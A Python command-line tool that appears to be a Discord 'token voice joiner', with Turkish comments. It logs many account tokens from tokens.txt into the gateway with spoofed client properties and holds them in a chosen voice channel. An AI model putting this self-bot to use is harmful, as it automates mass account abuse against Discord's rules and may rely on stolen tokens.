import asyncio
import json
import websockets
import os
from rich.console import Console
from rich.text import Text
import traceback  # Hata ayıklama için traceback ekledik
import sys
import subprocess

# Rich console setup
console = Console()

# Settings
tokens = []  # Tokens will be filled from tokens.txt later
server_id = None
channel_id = None
mute_deaf_status = None

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    banner = Text("""
╔════════════════════════════════════╗
║          TOKEN VOICE JOINER        ║
╠════════════════════════════════════╣
╔╗ ╔╗╔╗ ╔╗╔╗  ╔╗╔═══╗╔╗ ╔╗╔════╗
║║ ║║║║ ║║║╚╗╔╝║║╔═╗║║║ ║║╚══╗ ║
║╚═╝║║║ ║║╚╗╚╝╔╝║╚══╗║║ ║║  ╔╝╔╝
║╔═╗║║║ ║║ ╚╗╔╝ ╚══╗║║║ ║║ ╔╝╔╝ 
║║ ║║║╚═╝║  ║║  ║╚═╝║║╚═╝║╔╝ ╚═╗
╚╝ ╚╝╚═══╝  ╚╝  ╚═══╝╚═══╝╚════╝
          

          Developed by HUYSUZ
    """, style="bold cyan")
    banner.highlight_words("TOKEN VOICE JOINER", "green")
    console.print(banner)

def display_main_menu():
    console.print("[1]  > Voice Joiner", style="yellow")
    console.print("[S]  > Settings\n", style="yellow")

def display_settings_menu(selected_mute_deaf=None):
    mute_deaf_options = {
        1: Text("Unmute", style="green"),
        2: Text("Mute", style="red"),
        3: Text("Deaf", style="yellow"),
        4: Text("Mute + Deaf", style="magenta")
    }

    console.print("Mute/Deaf Settings:")
    for key, text in mute_deaf_options.items():
        selected = " x" if selected_mute_deaf == key else " "
        console.print(f"[{key}]{selected} {text}")

    console.print("\n[0] Go Back", style="white")

async def connect(token, server_id, channel_id, mute_deaf_status):
    """
    Belirtilen token ile Discord ses kanalına bağlanır ve ayarları uygular.

    Args:
        token (str): Discord hesabı token'ı.
        server_id (str): Sunucu (guild) ID'si.
        channel_id (str): Ses kanalı ID'si.
        mute_deaf_status (int): Mute/Deaf ayarı (1-4).
    """
    mute = False
    deaf = False
    reconnect_attempts = 5  # Yeniden bağlanma deneme sayısı
    
    # Determine the mute/deaf settings
    if mute_deaf_status == 2:  # Mute
        mute = True
        deaf = False
    elif mute_deaf_status == 3:  # Deaf
        mute = False
        deaf = True
    elif mute_deaf_status == 1:  # Unmute
        mute = False
        deaf = False
    elif mute_deaf_status == 4:  # Mute + Deaf
        mute = True
        deaf = True

    for attempt in range(reconnect_attempts):
        try:
            async with websockets.connect('wss://gateway.discord.gg/?v=9&encoding=json') as websocket:
                hello = await websocket.recv()
                hello_json = json.loads(hello)
                heartbeat_interval = hello_json['d']['heartbeat_interval'] / 1000  # saniye cinsine çevir
                
                # Kimlik doğrulama
                await websocket.send(json.dumps({"op": 2, "d": {"token": token.strip(), "properties": {"$os": "windows", "$browser": "Discord", "$device": "desktop"}}}))
                # Ses kanalına katılma
                await websocket.send(json.dumps({"op": 4, "d": {"guild_id": server_id, "channel_id": channel_id, "self_mute": mute, "self_deaf": deaf}}))
                
                async def heartbeat(ws, interval):
                    while True:
                        await asyncio.sleep(interval)
                        try:
                            await ws.send(json.dumps({"op": 1, "d": None}))
                        except websockets.ConnectionClosed:
                            break
                
                # Heartbeat'i asenkron olarak çalıştır
                asyncio.create_task(heartbeat(websocket, heartbeat_interval))

                try:
                    while True:
                        await websocket.recv()  # Gelen mesajları işle (şimdilik sadece tüketiyoruz)
                except websockets.ConnectionClosed:
                    console.print(f"Token {token.strip()} için bağlantı kesildi. Yeniden bağlanılıyor...", style="yellow")
                    await asyncio.sleep(5)  # 5 saniye bekle
                    continue  # Döngünün başına dön ve yeniden bağlanmayı dene
                except Exception as e:
                    console.print(f"Token {token.strip()} için beklenmeyen bir hata oluştu: {e}", style="red")
                    traceback.print_exc()  # Hatayı tam olarak yazdır
                    break  # Döngüden çık ve yeniden bağlanmayı deneme
            # Eğer buraya geldiyse, bağlantı normal şekilde kapandıysa yeniden bağlanma
            console.print(f"Token {token.strip()} için bağlantı kapandı. Yeniden bağlanılıyor...", style="yellow")
            await asyncio.sleep(5)
        
        except websockets.exceptions.ConnectionClosedError as e:
            console.print(f"Token {token.strip()} için bağlantı hatası (ConnectionClosedError): {e}. Yeniden deneniyor ({attempt + 1}/{reconnect_attempts})...", style="yellow")
            await asyncio.sleep(5)
        except websockets.exceptions.ConnectionClosedOK as e:
            console.print(f"Token {token.strip()} için bağlantı hatası (ConnectionClosedOK): {e}. Yeniden deneniyor ({attempt + 1}/{reconnect_attempts})...", style="yellow")
            await asyncio.sleep(5)
        except Exception as e:
            console.print(f"Token {token.strip()} için beklenmeyen bir hata oluştu: {e}. Yeniden bağlanma denenmiyor.", style="red")
            traceback.print_exc()  # Hatayı tam olarak yazdır
            break  # Yeniden bağlanmayı deneme döngüsünden çık
    else:
        console.print(f"Token {token.strip()} için tüm yeniden bağlanma denemeleri başarısız.", style="red")

async def run_voice_joiner(tokens, server_id, channel_id, mute_deaf_status):
    """
    Belirtilen tokenlerin hepsini aynı anda ses kanalına bağlar.

    Args:
        tokens (list): Discord hesap token'larının listesi.
        server_id (str): Sunucu (guild) ID'si.
        channel_id (str): Ses kanalı ID'si.
        mute_deaf_status (int): Mute/Deaf ayarı (1-4).
    """
    tasks = [connect(token, server_id, channel_id, mute_deaf_status) for token in tokens]
    await asyncio.gather(*tasks)

def kurulum_islemlerini_yap():
    """
    Gerekli kurulum işlemlerini yapar (paketleri kurar, tokens.txt dosyasını kontrol eder).
    """
    try:
        # requirements.txt dosyasındaki paketleri kur
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        console.print("Gerekli paketler başarıyla kuruldu.", style="green")

        # tokens.txt dosyasının varlığını kontrol et
        if not os.path.exists("tokens.txt"):
            with open("tokens.txt", "w") as f:
                f.write("")  # veya gerekli varsayılan içeriği yazabilirsiniz
            console.print("tokens.txt dosyası oluşturuldu. Lütfen tokenlerinizi ekleyin.", style="yellow")
        else:
            console.print("tokens.txt dosyası zaten mevcut.", style="green")

    except subprocess.CalledProcessError as e:
        console.print(f"Kurulum sırasında bir hata oluştu: {e}", style="red")
        input("Devam etmek için Enter'a basın...")  # Kullanıcıya okuma fırsatı ver
        sys.exit()  # Programı sonlandır
    except FileNotFoundError:
        console.print("pip komutu bulunamadı. Python'ın kurulu olduğundan ve PATH'e eklenmiş olduğundan emin olun.", style="red")
        input("Devam etmek için Enter'a basın...")
        sys.exit()

def main():
    """
    Ana uygulama döngüsü. Kullanıcıdan giriş alır ve işlemleri yönetir.
    """
    global server_id, channel_id, mute_deaf_status, tokens

    kurulum_islemlerini_yap()  # Kurulumu en başta yap

    while True:
        clear_screen()
        display_banner()
        display_main_menu()

        choice = console.input("Select an option: ").strip().lower()

        if choice == "s":
            while True:
                clear_screen()
                display_banner()
                display_settings_menu(selected_mute_deaf=mute_deaf_status)

                setting_choice = console.input("Choose your settings [0-4]: ").strip()

                if setting_choice == "0":
                    break
                elif setting_choice in ["1", "2", "3", "4"]:
                    mute_deaf_status = int(setting_choice)
        elif choice == "1":
            clear_screen()
            display_banner()

            console.print("[!] Enter Your Guild ID >:", style="white")
            server_id = input().strip()

            console.print("[+] Guild ID:", style="green")
            console.print(server_id, style="green")

            console.print("[!] Enter Channel ID >:", style="white")
            channel_id = input().strip()

            console.print("[+] Channel ID:", style="green")
            console.print(channel_id, style="green")

            with open('tokens.txt', 'r') as file:
                tokens = [line.strip() for line in file]  # Tokenleri okurken satır sonlarını temizle

            if mute_deaf_status is not None:
                asyncio.run(run_voice_joiner(tokens, server_id, channel_id, mute_deaf_status))
            else:
                console.print("[!] Please set all settings in Settings first.", style="red")

if __name__ == "__main__":
    main()